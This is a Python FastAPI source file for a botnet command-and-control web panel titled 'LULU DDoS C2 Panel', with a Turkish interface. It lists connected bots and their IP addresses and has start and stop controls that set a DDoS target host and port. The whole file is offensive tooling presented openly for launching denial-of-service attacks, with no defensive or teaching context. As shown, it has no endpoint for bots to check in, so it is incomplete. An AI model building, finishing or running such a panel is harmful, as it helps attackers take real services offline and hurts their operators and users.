from fastapi import FastAPI, Request
from datetime import datetime
import uvicorn

app = FastAPI()
bots = {}
ddos_target = ""
ddos_port = 80

@app.get("/panel")
async def panel():
    online = len(bots)
    botlist = "".join([f"<tr><td>{id}</td><td>{data['ip']}</td><td>{data['last'].strftime('%H:%M:%S')}</td></tr>" 
                       for id, data in bots.items()])

    return f"""
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>LULU C2 Panel</title>
        <style>
            body {{font-family: 'Courier New', monospace; background: #0d0d0d; color: #00ff00; margin:40px;}}
            h1 {{text-align:center; color:#00ff41; text-shadow: 0 0 10px #00ff41;}}
            .container {{max-width:900px; margin:auto; background:#111; padding:25px; border-radius:10px; border:1px solid #00ff41; box-shadow:0 0 20px rgba(0,255,65,0.3);}}
            input, button {{padding:12px; margin:8px 0; width:100%; border-radius:5px; border:1px solid #00ff41; background:#000; color:#00ff41; font-size:16px;}}
            button {{background:#003300; cursor:pointer; font-weight:bold; transition:0.3s;}}
            button:hover {{background:#006600; box-shadow:0 0 15px #00ff41;}}
            table {{width:100%; border-collapse:collapse; margin-top:20px;}}
            th, td {{padding:10px; border:1px solid #00ff41; text-align:left;}}
            th {{background:#002200;}}
            .status {{font-size:24px; font-weight:bold; text-align:center; margin:20px;}}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>LULU DDoS C2 PANEL</h1>
            
            <form method="post" action="/start">
                <label>Target IP / Domain:</label>
                <input type="text" name="ip" placeholder="örnek: 192.168.1.1 veya site.com" required>
                
                <label>Port:</label>
                <input type="number" name="port" value="80" min="1" max="65535" required>
                
                <button type="submit">▶ DDoS BAŞLAT</button>
            </form>
            
            <form method="post" action="/stop">
                <button type="submit" style="background:#330000;">■ DDoS DURDUR</button>
            </form>
            
            <div class="status">
                Aktif Bot: <span style="color:#ff0066;">{online}</span> adet
            </div>
            
            <table>
                <thead>
                    <tr><th>Bot ID</th><th>IP Adresi</th><th>Son Bağlantı</th></tr>
                </thead>
                <tbody>
                    {botlist if botlist else "<tr><td colspan='3' style='text-align:center;'>Henüz bot yok</td></tr>"}
                </tbody>
            </table>
            
            <br><center>© 2025 LULU Edgewalker C2</center>
        </div>
    </body>
    </html>
    """

@app.post("/start")
async def start(request: Request):
    global ddos_target, ddos_port
    form = await request.form()
    ddos_target = form["ip"]
    ddos_port = int(form["port"])
    return "DDoS BAŞLADI"

@app.post("/stop")
async def stop():
    global ddos_target
    ddos_target = ""
    return "DDoS DURDU"

uvicorn.run(app, host="0.0.0.0", port=8000)